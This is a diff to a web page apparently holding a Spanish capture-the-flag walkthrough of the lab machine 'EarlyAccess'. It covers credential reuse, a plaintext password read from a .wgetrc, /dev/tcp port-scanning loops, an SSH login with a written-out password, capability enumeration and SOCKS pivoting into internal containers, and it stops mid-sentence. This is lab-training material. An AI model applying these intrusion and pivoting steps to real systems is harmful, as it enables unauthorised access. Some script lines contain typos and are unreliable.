@@ -841,7 +841,7 @@ export function EarlyAccess() {
       />
       <Paragraph>
         Vemos que estamos en un contenedor ya que nuestro target es <i>10.10.11.110</i>, 
-        ahora que tenemos acceso poder hacer un tratamiento de la consola con <i>script</i>.
+        ahora tenemos acceso al sistema antes de continuar hacemos un tratamiento de la consola con <i>script</i>.
       </Paragraph>
       <Highlighter
         text={`
@@ -856,6 +856,234 @@ export function EarlyAccess() {
         www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ 
         `}
       />
+      <SubTitle>
+        usuario game-adm | Shell
+      </SubTitle>
+      <SubThreeTitle>
+        Enumeration
+      </SubThreeTitle>
+      <Paragraph>
+        Nos dirigimos a <i>/home</i>, visualizamos un usuario <i>www-adm</i> y un archivo <i>.wgetrc</i>
+        que puede ser interesante. 
+      </Paragraph>
+      <Highlighter
+        text={`
+          www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ cd /home
+          www-data@webserver:/home$ ls
+          www-adm
+          www-data@webserver:/home$ cd www-adm
+          www-data@webserver:/home/www-adm$ ls -la
+          drwxr-xr-x 2 www-adm www-adm 4096 Feb 14 20:41 .
+          drwxr-xr-x 1   root   root   4096 Feb 14 20:41 ..
+          drwxrwxrwx 1   root   root   4096 Feb 9  20:41 .bash_history -> /dev/null
+          -rw-r--r-- 1 www-adm www-adm  220 Apr 18  2019 .bash_logout
+          -rw-r--r-- 1 www-adm www-adm 3526 Apr 18  2019 .bashrc
+          -rw-r--r-- 1 www-adm www-adm  887 Apr 18  2019 .profile
+          -r-------- 1 www-adm www-adm   33 Feb 14 20:41 .wgetrc
+          www-data@webserver:/home/www-adm$ cat .wgetrc
+          cat: .wgetrc: Permission denied
+        `}
+      />
+      <Paragraph>
+        Vemos si las credenciales anteriores en <i>https://dev.earlyaccess.htb</i> son reutilizables.
+      </Paragraph>
+      <Highlighter
+        text={`
+        www-data@webserver:/home/www-adm$ su www-adm
+        Password:
+        www-adm@webserver:~$
+        `}
+      />
+      <Paragraph>
+        Estando como el usuario <i>www-adm</i> vemos si podemos ver <i>cat ~/.wgetrc</i>
+      </Paragraph>
+      <Highlighter
+        text={`
+        www-adm@webserver:$ cat ~/.wgetrc
+        user=api
+        password=s3Cur3_API_PW!
+        www-adm@webserver:$
+        `}
+      />
+      <Paragraph>
+        Ahora utilizando nc, verificaremos si existe alguna maquina con el nombre <i>API</i>
+      </Paragraph>
+      <Highlighter
+        text={`
+        www-adm@webserver:$ nc API 80
+        API [172.18.0.101] 80 (http) : Connection refused
+        `}
+      />
+      <Paragraph>
+        y si existe tal maquina lo que no sabemos es que puertos tiene abiertos para 
+        ello crearemos un scaner en <i>/tmp</i>
+      </Paragraph>
+      <Highlighter
+        text={`
+          for port in $(seq 1 65535); do
+            timeout 1 bash -c "echo '' > /dev/tcp/172.18.0.101/$port" 2>/dev/null && echo "[+] $port - Open" &
+          done; wait
+        `}
+      />
+      <Paragraph>
+        Ejecutamos nuestro script...
+      </Paragraph>
+      <Highlighter
+        text={`
+        www-adm@webserver:/tmp$ ./scan.sh
+              [+] 5000 - Open
+        `}
+      />
+      <Paragraph>
+       Vemos el puerto 5000 abierto intentaremos descargarlo...  
+      </Paragraph>
+      <Highlighter
+        text={`
+        www-adm@webserver:/tmp$ wget http://172.18.0.101:5000
+        `}
+      />
+      <Paragraph>
+        vemos un archivo <i>index.html</i> que dice: <i>Welcome to the game-key verification API! You can verify your keys via: /verify/game-key. If you are using manual ... te database using /check_db</i> 
+        vemos un archivo <i>check_db</i>, lo descargamos...
+      </Paragraph>
+      <Highlighter
+        text={`
+          www-adm@webserver:/tmp$ wget http://172.18.0.101:5000/check_db
+        `}
+      />
+      <Image
+        src='/early_json_pass.webp'
+        layout="responsive"
+        width={721}
+        height={795}
+      />
+      <Paragraph>
+        ingresamos por ssh a la <i>10.10.11.110</i> con las credenciales <i>drew</i>.
+      </Paragraph>
+      <Highlighter
+        text={`
+          sshpass -p "XeoNu86JTznxMCQuGHrGutF3Csq5" ssh drew@10.10.11.110
+          drew@earlyacccess:~$ ls
+          user.txt
+          drew@earlyacccess:~$ cat user.txt
+          **************************
+        `}
+      />
+      <Paragraph>
+        Ejecutaremos <a src='https://github.com/carlospolop/PEASS-ng' noreferer={true}>linpeas</a>, y veremos un correo de Game-adm a drew,
+        el cual dice que si el juego se rompe automaticamente estara online en 1m aproximadamente. 
+      </Paragraph>
+      <Paragraph>
+        Tambien vemos que ...
+      </Paragraph>
+      <Highlighter
+        text={`
+          game-adm@earlyaccess:/$ getcap -r / 2>/dev/null
+          /usr/sbin/arp =ep
+          /usr/bin/ping = cap_net_raw+ep
+        `}
+      />
+      <Paragraph>
+        teniendo arp que vale <i>=ep</i> podemos leer archivos root pero arp solo pueden ejecutarlo los del grupo adm, 
+        entonces si nos converdimos en <i>game-adm</i> podremos escalar privilegios.
+      </Paragraph>
+      <Highlighter
+        text={`
+          game-adm@earlyaccess:/$ ls -l /usr/sbin/arp
+          -rwxr-x--- 1 root  adm 67512 Sep 24 2018 /usr/sbin/arp
+        `}
+      />
+      <SubTitle>
+        Root Shell
+      </SubTitle>
+      <Paragraph>
+        Ahora toca meterse como root, vemos un <i>.ssh</i> con un rsa publica y privada, en la publica
+        nos muestra <i>game-tester@game-server</i> al final del output vemos un nuevo usuario <i>game-tester</i> y un contenedor <i>game-server</i> 
+        que no nos resuelve por ejemplo <i>ping -c 1 game-server</i>.
+      </Paragraph>
+      <Paragraph>
+        Toca hacer un descubrimiento de puertos en <i>hostname -I</i> y verificar cual es el que tiene el puerto  22 abierto asi ingresaremos con la rsa pública, para 
+        ello montaremos un script.  
+      </Paragraph>
+      <Highlighter
+        text={`
+          #!/bin/bash
+          networks=$(hostname -I)
+          
+          for net in $\{networks[@]}; do
+            echo -e "\\n[+] Escaneando el puerto $net.0/22:\\n"
+            for i in $(seg 1 254); do
+                timeout 1 bash -c  "ping -c 1 $network.$i" &>/dev/null && echo -e "[+] Host: $network.$i - Open" &
+            done; wait
+          done
+        `}
+      />
+      <Paragraph>
+        Ahora teniendo los hostname terminando en <i>.0</i> crearemos otro script para ver en cual de ellos esta el puerto 22 abierto.
+      </Paragraph>
+      <Highlighter
+        text={`
+          #!/bin/bash
+          hostnames=(172.18.0.100 172.18.0.101 172.18.0.102 172.18.0.2 172.19.0.2 172.19.0.3)
+          
+          for host in $\{hostnames[@]}; do
+            timeout 1 bash -c  "echo '' > /dev/tcp/$host/22" 2>/dev/null && echo "[+] Puerto 22 esta abierto en $host"
+          done
+        `}
+      />
+      <Highlighter
+        text={`
+          drew@earlyacccess:/tmp$ ./port22Open.sh
+          [+] Puerto 22 esta abierto en 172.19.0.3
+        `}
+      />
+      <Paragraph>
+        Ahora nos conectamos por <i>ssh</i> a la <i>172.19.0.3</i>
+      </Paragraph>
+      <Highlighter
+        text={`
+          drew@earlyacccess:~/.ssh$ ssh game-tester@172.19.0.3 
+        `}
+      />
+      <Paragraph>
+        Ahora estamos como <i>game-tester</i> con el host <i>game-server</i> tal vez en algun puerto de este 
+        host esta corriendo el servidor web para ello vemos...
+      </Paragraph>
+      <Highlighter
+        text={`
+          game-tester@game-server:/$ ss -nltp
+          ...
+          LISTEN  0   128   *:9999  *:*
+          ... 
+        `}
+      />
+      <Paragraph>
+        de primeras no tenemos resolucion a esa ruta que esta en un contenedor pero podriamos ingresar 
+        con ssh y el parametro -D
+      </Paragraph>
+      <Highlighter
+        text={`
+          sshpass -p "XeoNu86JTznxMCQuGHrGutF3Csq5" ssh drew@10.10.11.110 -D 1080
+        `}
+      />
+      <Paragraph>
+        con la extension de foxy proxy por ejemplo configuramos...
+      </Paragraph>
+      <Image
+        src='/early_foxy_proxy.webp'
+        layout="responsive"
+        width={540}
+        height={241}
+      />
+      <Image
+        src='/early_game_9999.webp'
+        layout="responsive"
+        width={528}
+        height={222}
+      />
+      <Paragraph>
+        ahora
+      </Paragraph>
     </ContentBlock>
   </>
 }
